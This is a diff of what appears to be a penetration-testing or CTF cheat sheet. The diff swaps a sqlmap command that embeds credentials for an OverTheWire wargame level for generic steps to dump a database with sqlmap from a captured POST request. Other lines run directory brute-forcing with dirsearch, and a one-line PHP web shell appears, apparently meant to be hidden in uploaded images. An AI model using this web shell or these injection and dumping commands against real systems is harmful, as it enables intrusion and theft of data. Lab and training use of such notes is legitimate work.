@@ -33,7 +33,27 @@ If luck still isnt on our side, we add tomcat default credentials too at the beg
 python3 dirsearch.py -u host --proxy=http://host:port/ -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
 
 ## SQL Map
-./sqlmap.py --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -u http://natas15.natas.labs.overthewire.org/index.php --data="username=a" -p username --string=doesn --level=5 --user-agent=Mozilla --dbms=MySQL --threads 4 -D natas15 -T users --dump
+### SQL Injection
+If we have a input box vulnerable to `SQL Injection`, we can execute this command through a `POST` request:  
+`sqlmap.py -r post.txt -p id --dump`  
+In the post file we will have the `POST` request, we can get it from `Google Developer tools` or `Burp`  
+(post.txt)
+```sh
+POST /index.php HTTP/1.1
+Host: host
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://host/index.php
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+ 
+id=a&submit1=submit
+```
 
 ## Image Valun
 <?php system($_GET['cmd']); die(); ?>
